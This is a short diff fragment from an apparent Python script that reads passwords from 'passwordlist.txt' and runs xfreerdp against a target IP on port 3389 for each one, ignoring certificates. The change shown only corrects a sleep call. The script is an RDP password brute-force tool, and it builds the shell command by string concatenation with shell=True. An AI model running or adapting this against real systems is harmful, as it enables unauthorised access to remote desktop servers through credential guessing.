@@ -11,4 +11,4 @@ with open('passwordlist.txt') as f:
 		cmd = 'xfreerdp /cert-ignore /u:' + user + ' /p:"' + password + '" /v:' + ip + ':3389'
 		#print(cmd)
 		x = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-    sleep(5)
+		time.sleep(5)
